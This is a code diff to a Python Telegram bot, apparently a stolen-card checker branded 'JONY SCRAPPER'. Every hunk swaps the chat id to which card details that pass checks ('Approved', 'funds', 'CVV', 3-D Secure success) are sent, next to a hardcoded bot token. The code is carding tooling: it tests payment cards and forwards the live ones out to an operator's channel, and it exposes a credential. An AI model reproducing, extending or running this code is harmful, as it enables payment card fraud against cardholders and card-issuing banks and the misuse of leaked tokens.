@@ -347,7 +347,7 @@ def menu_callback(call):
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					if 'success' in last:
 						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-						acc =  '-1002237336934'
+						acc =  '-1002222638488'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -368,7 +368,7 @@ def menu_callback(call):
 						bot.send_message(call.from_user.id, msg)
 					elif "funds" in last:
 						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-						acc =  '-1002237336934'
+						acc =  '-1002222638488'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -389,7 +389,7 @@ def menu_callback(call):
 						live+=1
 					elif "card's security" in last:
 						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-						acc =  '-1002237336934'
+						acc =  '-1002222638488'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -528,7 +528,7 @@ def menu_callback(call):
 
 					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
 						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-						acc =  '-1002237336934'
+						acc =  '-1002222638488'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -552,7 +552,7 @@ def menu_callback(call):
 						bot.send_message(call.from_user.id, risk)
 					elif 'CVV' in last:
 						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-						acc =  '-1002237336934'
+						acc =  '-1002222638488'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -766,7 +766,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
 		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-		acc =  '-1002237336934'
+		acc =  '-1002222638488'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -973,7 +973,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝗕𝗼𝘁 𝗕𝘆: @YourExDestiny</b>'''
 	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
 		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-		acc =  '-1002237336934'
+		acc =  '-1002222638488'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1209,7 +1209,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'success' in last:
 		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-		acc =  '-1002237336934'
+		acc =  '-1002222638488'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1236,7 +1236,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
 	elif "funds" in last:
 		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-		acc =  '-1002237336934'
+		acc =  '-1002222638488'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1263,7 +1263,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
 	elif "card's security" in last:
 		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-		acc =  '-1002237336934'
+		acc =  '-1002222638488'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1533,7 +1533,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
 		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
-		acc =  '-1002237336934'
+		acc =  '-1002222638488'
 		mg = f"""<b> 
 ❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
